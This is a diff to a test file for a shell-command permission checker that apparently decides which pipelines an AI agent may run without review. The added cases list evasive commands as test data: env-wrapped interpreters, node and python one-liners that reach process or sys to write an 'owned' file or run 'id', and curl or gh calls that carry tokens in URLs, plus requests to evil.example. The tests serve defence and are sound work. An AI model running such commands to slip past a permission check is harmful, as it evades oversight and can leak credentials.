@@ -245,6 +245,32 @@ describe('permissionWarningRuleIds — mechanical check after a model allow', ()
  * pulled out of git config). Those go back to the model; anything this check does
  * not recognise goes to the model too.
  */
+describe('review r6 (astra) — reader shapes that are not the reader they look like', () => {
+  it('an env-wrapped or path-qualified interpreter is not a data reader (env -S runs its own argv)', () => {
+    for (const cmd of [
+      `echo ok | env -S./payload python3 -c 'print(1)'`,
+      `echo ok | env -i python3 -c 'print(1)'`,
+      `echo ok | ./python3 -c 'print(1)'`,
+      `echo ok | /tmp/x/node -e 'console.log(1)'`,
+    ]) {
+      expect(permissionWarningRuleIds(cmd, PIPE), cmd).toEqual(PIPE);
+      expect(isPlainReadPipeline(cmd), cmd).toBe(false);
+    }
+  });
+
+  it('process / sys reach is caught with whitespace or optional chaining around the dot', () => {
+    for (const cmd of [
+      `echo ok | node -e 'process . getBuiltinModule("f"+"s").appendFile("/tmp/c1-proof", "owned", ()=>{})'`,
+      `echo ok | node -e 'process?.getBuiltinModule("fs")'`,
+      `echo ok | node -e 'process	.mainModule'`,
+      `echo ok | python3 -c 'import sys; sys . modules["os"].system("id")'`,
+    ]) {
+      expect(permissionWarningRuleIds(cmd, PIPE), cmd).toEqual(PIPE);
+      expect(isPlainReadPipeline(cmd), cmd).toBe(false);
+    }
+  });
+});
+
 describe('isPlainReadPipeline — the only shape that runs without the model', () => {
   const READER = `python3 -c "import json,sys; print(json.load(sys.stdin)['state'])"`;
 
@@ -317,6 +343,13 @@ describe('isPlainReadPipeline — the only shape that runs without the model', (
       `gh api --hostname=evil.example repos/o/r | ${READER}`,
       `gh api https://evil.example/x | ${READER}`,
       `gh api //evil.example/x | ${READER}`,
+      // review r6 (astra): credentials in the URL itself
+      `curl -s 'https://user:secret@example.com/' | ${READER}`,
+      `curl -s https://user@example.com/x | ${READER}`,
+      `curl -s 'https://api.example.com/x?access_token=ghp_abc' | ${READER}`,
+      `curl -s 'https://api.example.com/x?api_key=k' | ${READER}`,
+      `curl -s 'https://bucket.s3.amazonaws.com/o?X-Amz-Signature=abc&X-Amz-Credential=c' | ${READER}`,
+      `gh api 'repos/o/r?access_token=ghp_abc' | ${READER}`,
       `gh api repos/o/r --jq env | ${READER}`,
       `gh api repos/o/r -q '$ENV' | ${READER}`,
       `gh pr view 1 --json title --jq env | ${READER}`,
